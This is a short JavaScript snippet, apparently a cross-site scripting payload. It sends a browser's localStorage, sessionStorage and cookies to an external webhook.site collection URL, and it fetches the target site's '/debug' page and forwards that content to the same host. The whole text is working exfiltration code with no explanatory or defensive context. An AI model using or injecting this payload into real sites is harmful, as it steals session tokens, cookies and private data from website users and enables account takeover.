var w='https://webhook.site/39b226d4-f904-47c4-81fa-28fb8924387a';
fetch(w+'/ls?d='+encodeURIComponent(JSON.stringify(localStorage)));
fetch(w+'/ss?d='+encodeURIComponent(JSON.stringify(sessionStorage)));
fetch(w+'/cookie?d='+encodeURIComponent(document.cookie));
fetch('/debug').then(r=>r.text()).then(t=>fetch(w+'/deb?d='+encodeURIComponent(t)));
